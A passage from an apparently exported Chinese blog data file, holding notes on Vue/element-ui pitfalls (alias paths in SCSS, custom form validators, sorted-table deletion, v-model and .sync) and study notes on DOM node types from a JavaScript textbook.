Prettier，配置文件选择放在单独文件，ui 库用 element-ui。</p>\n<h2 id=\"URL-转换规则\"><a href=\"#URL-转换规则\" class=\"headerlink\" title=\"URL 转换规则\"></a>URL 转换规则</h2><p>对于资源的引用路径，可以用相对路径，也可以用绝对路径，但是实际中，对于嵌套太深的一般使用绝对路径比较合适。在 vue-cli 初始化的项目中默认设置了<code>@</code>别名作为 src 根目录，当然我们也可以在 webpack 配置文件中设置更多的别名。</p>\n<p>在 js 中引用资源的相对路径与绝对路径示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简洁</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> MainTitle <span class=\"keyword\">from</span> <span class=\"string\">\"@/components/MainTitle\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 复杂，容易搞错层级</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> MainTitle <span class=\"keyword\">from</span> <span class=\"string\">\"../../../components/MainTitle\"</span>;</span><br></pre></td></tr></table></figure>\n<p>既然使用别名这么方便，那么在 css 中引用图片也这样搞吧:</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.select-flag</span> &#123;</span><br><span class=\"line\">  &amp;:before &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">11px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">5px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: url(<span class=\"string\">\"@/assets/milan/common/img/icon/flags.png\"</span>) no-repeat;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果报错如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Failed to compile.</span><br><span class=\"line\"></span><br><span class=\"line\">./src/components/CountrySelect/index.vue?vue&amp;type=style&amp;index=0&amp;id=432f6435&amp;lang=scss&amp;scoped=true&amp; (./node_modules/css-loader??ref--8-oneOf-1-1!./node_modules/vue-loader/lib/loaders/stylePostLoader.js!./node_modules/postcss-loader/src??ref--8-oneOf-1-2!./node_modules/sass-loader/lib/loader.js??ref--8-oneOf-1-3!./node_modules/cache-loader/dist/cjs.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./src/components/CountrySelect/index.vue?vue&amp;type=style&amp;index=0&amp;id=432f6435&amp;lang=scss&amp;scoped=true&amp;)</span><br><span class=\"line\">Module not found: Error: Can&apos;t resolve &apos;./@/assets/milan/common/img/icon/flags.png&apos; in &apos;H:\\workspace\\vue\\venice\\src\\components\\CountrySelect&apos;</span><br></pre></td></tr></table></figure>\n<p>细看这个报错信息，可知 css-loader 编译时没有找到引用的资源。解决方式为：<code>background: url(&quot;~@/assets/milan/common/img/icon/flags.png&quot;) no-repeat;</code>。原因是，<code>@</code>与<code>~</code>开头都会作为一个模块请求被解析，但是<code>@</code>开头仅作用域模板中。详细见<a href=\"https://cli.vuejs.org/zh/guide/html-and-static-assets.html#url-%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99\" target=\"_blank\" rel=\"noopener\">官网</a>。</p>\n<h2 id=\"element-ui-自定义校验\"><a href=\"#element-ui-自定义校验\" class=\"headerlink\" title=\"element-ui 自定义校验\"></a>element-ui 自定义校验</h2><p>element 的表单校验与 ant-d 一样都是用的第三方库<a href=\"https://github.com/yiminghe/async-validator/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">async-validator\n</a>。因为 element-ui 官网这块只是一带而过，详细的还是要查看该集成库的文档。下面以自定义同步校验与异步校验为例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">data() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> phoneRepeat = <span class=\"function\">(<span class=\"params\">rule, value, callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    request(&#123;</span><br><span class=\"line\">      url: <span class=\"string\">\"/api/account/phoneRepeat\"</span>,</span><br><span class=\"line\">      method: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">      params: &#123; <span class=\"attr\">regionId</span>: <span class=\"keyword\">this</span>.ruleForm.regionId, <span class=\"attr\">phone</span>: value &#125;</span><br><span class=\"line\">    &#125;).then(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> result = response.data;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (result.code == <span class=\"string\">\"10002\"</span>) &#123;</span><br><span class=\"line\">        callback(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(rule.message));</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        callback();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> telNumCn = <span class=\"function\">(<span class=\"params\">rule, value, callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> reg = <span class=\"regexp\">/^1\\d&#123;10&#125;$/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.ruleForm.regionId === <span class=\"string\">\"China\"</span> &amp;&amp; !reg.test(value)) &#123;</span><br><span class=\"line\">      callback(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(rule.message));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      callback();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    titleTxt: <span class=\"string\">\"管理子账户 \"</span>,</span><br><span class=\"line\">    titleDesc: <span class=\"string\">\"仅提供业务员身份的子账户，用于管理除资金以外的所有权限。\"</span>,</span><br><span class=\"line\">    ruleForm: &#123;</span><br><span class=\"line\">      type: <span class=\"string\">\"01\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      email: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      regionId: <span class=\"string\">\"China\"</span>,</span><br><span class=\"line\">      phone: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      password: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      repeatpwd: <span class=\"string\">\"\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    rules: &#123;</span><br><span class=\"line\">      phone: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"请输入手机号码。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          validator: telNumCn,</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"请提供有效的中国大陆手机号码。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          validator: phoneRepeat,</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"此手机已被作为安全手机使用过，请更换。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>想着校验函数复用，一开始根据 element 示例，想着用一个高阶函数传入 message 生成 validator 函数。后来发现<code>rule</code>参数就是指向我们配置的规则对象，因此直接在 rules 中配置 message 即可，当然也可以增加其他参数供 validator 函数使用。</p>\n<h2 id=\"el-table组件删除问题\"><a href=\"#el-table组件删除问题\" class=\"headerlink\" title=\"el-table组件删除问题\"></a><code>el-table</code>组件删除问题</h2><p>问题很小，就是用了官方示例，删除成功，但是不是对应的那一条：<br><img src=\"/Vue-restructure-jQuery-1/GIF.gif\" alt=\"效果图\"><br>检查代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">el-table</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:data</span>=<span class=\"string\">\"tableData\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100%\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:default-sort</span>=<span class=\"string\">\"&#123;prop: 'name', order: 'descending'&#125;\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"姓名\"</span> <span class=\"attr\">sortable</span> <span class=\"attr\">sort-by</span>=<span class=\"string\">\"name\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"type\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"类型\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"email\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"登录邮箱\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"phone\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"安全手机\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"time\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"添加时间\"</span> <span class=\"attr\">sortable</span> <span class=\"attr\">sort-by</span>=<span class=\"string\">\"time\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">label</span>=<span class=\"string\">\"操作\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"100\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">v-slot</span>=<span class=\"string\">\"scope\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">el-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleEdit(scope.$index, scope.row)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>编辑<span class=\"tag\">&lt;/<span class=\"name\">el-button</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">el-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleDelete(scope.$index, scope.row)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>删除<span class=\"tag\">&lt;/<span class=\"name\">el-button</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">el-table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handleDelete(index, row) &#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.tableData.splice(index, <span class=\"number\">1</span>);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没啥问题啊。唉！最后发现加了默认排序，导致展示的顺序与实际的数据顺序不一致，当然根据索引删除也就对不上号了。因此，有排序的，只能通过唯一性的字段，如id，来进行查询筛选了。</p>\n<h2 id=\"自定义组件-v-model-使用\"><a href=\"#自定义组件-v-model-使用\" class=\"headerlink\" title=\"自定义组件 v-model 使用\"></a>自定义组件 v-model 使用</h2><p>一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value 特性用于不同的目的。model 选项可以用来避免这样的冲突：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">my-checkbox</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"foo\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"some value\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">my-checkbox</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Vue.component(<span class=\"string\">'my-checkbox'</span>, &#123;</span><br><span class=\"line\">  model: &#123;</span><br><span class=\"line\">    prop: <span class=\"string\">'checked'</span>,</span><br><span class=\"line\">    event: <span class=\"string\">'change'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// this allows using the `value` prop for a different purpose</span></span><br><span class=\"line\">    value: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    <span class=\"comment\">// use `checked` as the prop which take the place of `value`</span></span><br><span class=\"line\">    checked: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Number</span>,</span><br><span class=\"line\">      <span class=\"keyword\">default</span>: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"sync-修饰符\"><a href=\"#sync-修饰符\" class=\"headerlink\" title=\"sync 修饰符\"></a>sync 修饰符</h2><p>原以为加了 sync 的 prop 就可以像普通的 data 定义变量一样使用，结果当然是错的。其实只是一种针对通过自定义事件修改 prop 的一种简写。使用这种简写的前提是约定自定义事件名为<code>update:xxx</code>，其实只是通过约定，减少了传入事件函数，对于子组件还是需要调用<code>$emit</code>方法去触发。示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text-document</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-bind:title</span>=<span class=\"string\">\"doc.title\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-on:update:title</span>=<span class=\"string\">\"doc.title = $event\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">text-document</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 可以简写成这样： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text-document</span> <span class=\"attr\">v-bind:title.sync</span>=<span class=\"string\">\"doc.title\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">text-document</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 子组件中触发赋值意图</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"update:title\"</span>, newTitle);</span><br></pre></td></tr></table></figure>"},{"title":"DOM（《JavaScript高级程序设计》）","date":"2019-01-28T10:59:47.000Z","updated":"2019-01-28T10:59:47.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\nDOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API（应用程序编程接口）。DOM 描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。\n\n<!-- more -->\n\n# 详述\n\n## 节点层次\n\nHTML 与 DOM 树对应关系示例：\n\n```html\n<html>\n  <head>\n    <title>Sample Page</title>\n  </head>\n  <body>\n    <p>Hello World!</p>\n  </body>\n</html>\n```\n\n![DOM树示例](1.jpg)\n\n文档节点是每个文档的根节点。在这个例子中，文档节点只有一个子节点，即<html>元素，我们称之为**文档元素**。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。\n\n### Node 类型\n\nDOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。JavaScript 中通过 Node 类型来实现，作为基类，所有节点类型都继承自 Node 类型。\n\nnodeType 属性：表明节点的类型，由 12 个数值常量来表示。实践中，为了兼容，通常与数值比较，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  //适用于所有浏览器\n  alert(\"Node is an element.\");\n}\n```\n\nnodeName 和 nodeValue 属性：值取决于节点类型，因此实践中通常先检测类型再取值，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  value = someNode.nodeName; //nodeName 的值是元素的标签名\n}\n```\n\nchildNodes 属性：保存着一个 NodeList 对象。NodeList 对象时一种类数组对象，基于 DOM 动态执行查询的结果，DOM 结构的变化能够自动反映在 NodeList 对象中。\n\n其他属性：parentNode，previousSibling，nextSibling，firstChild，lastChild，ownerDocument。\n\nhasChildNodes()方法：无参数，有节点时返回 true。\n\nappendChild()方法：一个参数，要添加的节点，如果该节点已经存在文档中，那么就是移动节点。\n\ninsertBefore()方法：两个参数，要插入的节点和作为参照的节点。\n\nreplaceChild()方法：两个参数，要插入的节点和要替换的节点。\n\nremoveChild()方法：一个参数，要移除的节点。\n\ncloneNode()方法：一个布尔参数，表示是否深复制。\n\nnormalize()方法：处理文本节点，后面章节再详述。\n\n### Document 类型\n\n在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。\n\nDocument 节点具有下列特征：\n\n- nodeType 的值为 9；\n- nodeName 的值为\"#document\"；\n- nodeValue 的值为 null；\n- parentNode 的值为 null；\n- ownerDocument 的值为 null；\n- 其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。\n\n#### 文档的子节点\n\n```html\n<html>\n  <body></body>\n</html>\n```\n\n```js\nvar html = document.documentElement; //取得对<html>的引用\nalert(html === document.childNodes[0]); //true\nalert(html === document.firstChild); //true\n\nvar body = document.body; //取得对<body>的引用\n```\n\n#### 文档信息\n\n```js\n//取得文档标题\nvar originalTitle = document.title;\n//设置文档标题\ndocument.title = \"New page title\";\n\n//取得完整的URL\nvar url = document.URL;\n//取得域名\nvar domain = document.domain;\n//取得来源页面的URL\nvar referrer = document.referrer;\n```\n\n其中 domain 可设置，但是不能将这个属性设置为 URL 中不包含的域\n\n```js\n//假设页面来自p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; // 成功\ndocument.domain = \"nczonline.net\"; // 出错！\n```\n\n还有一个限制，不能从松散到紧绷\n\n```js\n//假设页面来自于p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; //松散的（成功）\ndocument.domain = \"p2p.wrox.com\"; //紧绷的（出错！）\n```\n\n实践中可以利用 domain 可设置来解决子域之间跨域问题\n\n#### 查找元素\n\ngetElementById()，。这里的 ID 必须与页面中元素的 id 特性（attribute）严格匹配，包括大小写。\n\ngetElementsByTagName()，返回一个 NodeList，在 HTML 文档中对应的是 HTMLCollection 对象。\n对 HTMLCollection 而言，我们可以向方括号中传入数值或字符串形式的索引值。在后台，对数\n值索引就会调用 item()，而对字符串索引就会调用 namedItem()。\n\n```js\nvar images = document.getElementsByTagName(\"img\");\nalert(images.length); //输出图像的数量\nalert(images[0].src); //输出第一个图像元素的src 特性\nalert(images.item(0).src); //输出第一个图像元素的 src 特性\n\n// <img src=\"myimage.gif\" name=\"myImage\">\nvar myImage = images.namedItem(\"myImage\");\nvar myImage = images[\"myImage\"];\n\nvar allElements = document.getElementsByTagName(\"*\");\n```\n\ngetElementsByName()，只有 HTMLDocument 类型才有的方法。\n\n```html\n<fieldset>\n  <legend>Which color do you prefer?</legend>\n  <ul>\n    <li>\n      <input type=\"radio\" value=\"red\" name=\"color\" id=\"colorRed\" />\n      <label for=\"colorRed\">Red</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"green\" name=\"color\" id=\"colorGreen\" />\n      <label for=\"colorGreen\">Green</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"blue\" name=\"color\" id=\"colorBlue\" />\n      <label for=\"colorBlue\">Blue</label>\n    </li>\n  </ul>\n</fieldset>\n```\n\n```js\nvar radios = document.getElementsByName(\"color\");\n```\n\n#### 特殊集合\n\n除了属性和方法，document 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象，\n为访问文档常用的部分提供了快捷方式，包括：\n\n- document.anchors，包含文档中所有带 name 特性的`<a>`元素；\n- document.applets，包含文档中所有的`<applet>`元素，因为不再推荐使用`<applet>`元素，所以这个集合已经不建议使用了；\n- document.forms，包含文档中所有的`<form>`元素，与 document.getElementsByTagName(\"form\")得到的结果相同；\n- document.images，包含文档中所有的`<img>`元素，与 document.getElementsByTagName(\"img\")得到的结果相同；\n- document.links，包含文档中所有带 href 特性的`<a>`元素。\n\n#### 其他\n\n```js\ndocument.implementation.hasFeature();\ndocument.write();\ndocument.writeln();\ndocument.open();\ndocument.close();\n```\n\n### Element 类型\n\nElement 类型用于表现 XML 或 HTML 元素，提供了对元素标签名、子节点及特性的访问。Element 节点具有以下特征：\n\n- nodeType 的值为 1；\n- nodeName 的值为元素的标签名；\n- nodeValue 的值为 null；\n- parentNode 可能是 Document 或 Element；\n- 其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。\n  要访问元素的标签名，可以使用 nodeName 属性，也可以使用 tagName 属性。\n\n对于标签名，HTML 中始终返回全大写，XML 中返回与源代码中一致，因此，实践中通常直接用 toLowerCase()转换后比较。如下：\n\n```js\n// <div id=\"myDiv\"></div>\nvar div = document.getElementById(\"myDiv\");\nalert(div.tagName); //\"DIV\"\nalert(div.tagName == div.nodeName); //true\n\nif (element.tagName == \"div\") {\n  //不能这样比较，很容易出错！\n  //在此执行某些操作\n}\nif (element.tagName.toLowerCase() == \"div\") {\n  //这样最好（适用于任何文档）\n  //在此执行某些操作\n}\n```\n\n#### HTML 元素\n\n对应的对象共有的读写属性有：`id,title,className,lang,dir`\n\n#### 操作特性\n\ngetAttribute()、setAttribute()、removeAttribute()、setAttribute()\n\n特性名称不区分大小写，自定义特性加 data-前缀。\n\n实践中，操作特性，常用对象的属性（div.id），只有自定义特性才用 getAttribute()、setAttribute()。\n\n#### attributes 属性\n\n一般只在遍历元素的属性时使用，例如：\n\n```js\nfunction outputAttributes(element) {\n  var pairs = new Array(),\n    attrName,\n    attrValue,\n    i,\n    len;\n  for (i = 0, len = element.attributes.length; i < len; i++) {\n    attrName = element.attributes[i].nodeName;\n    attrValue = element.attributes[i].nodeValue;\n    pairs.push(attrName + '=\"' + attrValue + '\"');\n  }\n  return pairs.join(\" \");\n}\n```\n\n#### 创建元素\n\ndocument.createElement()，一个参数，要创建元素的标签名。\n\n```js\nvar div = document.createElement(\"div\");\n```\n\n#### 元素的子节点\n\n大部分浏览器中，空格、换行都会作为元素的子节点，因此实践中会先检查 nodeType 属性，如下：\n\n```js\nfor (var i = 0, len = element.childNodes.length; i < len; i++) {\n  if (element.childNodes[i].nodeType == 1) {\n    //执行某些操作\n  }\n}\n```\n\n### Text 类型\n\n文本节点由 Text 类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的 HTML 字符，但不能包含 HTML 代码。Text 节点具有以下特征：\n\n- nodeType 的值为 3；\n- nodeName 的值为\"#text\"；\n- nodeValue 的值为节点所包含的文本；\n- parentNode 是一个 Element；\n- 不支持（没有）子节点。\n\n可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 nodeValue 的修改也会通过 data 反映出来，反之亦然。使用下列方法可以操作节点中的文本。\n\n- appendData(text)：将 text 添加到节点的末尾。\n- deleteData(offset, count)：从 offset 指定的位置开始删除 count 个字符。\n- insertData(offset, text)：在 offset 指定的位置插入 text。\n- replaceData(offset, count, text)：用 text 替换从 offset 指定的位置开始到 offset+count 为止处的文本。\n- splitText(offset)：从 offset 指定的位置将当前文本节点分成两个文本节点。\n- substringData(offset, count)：提取从 offset 指定的位置开始到 offset+count 为止处的字符串。\n\nlength 属性，保存着节点中字符的数目。\n\n#### 创建文本节点\n\ndocument.createTextNode()，一个参数，要插入节点中的文本。\n\n#### 规范化文本节点\n\nnormalize()，在父元素上调用该方法，会把所有文本节点合并成一个节点。\n\n#### 分割文本节点\n\nsplitText()，一个参数，指定位置分割文本节点。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。\n\n### 其他类型\n\n了解 Comment 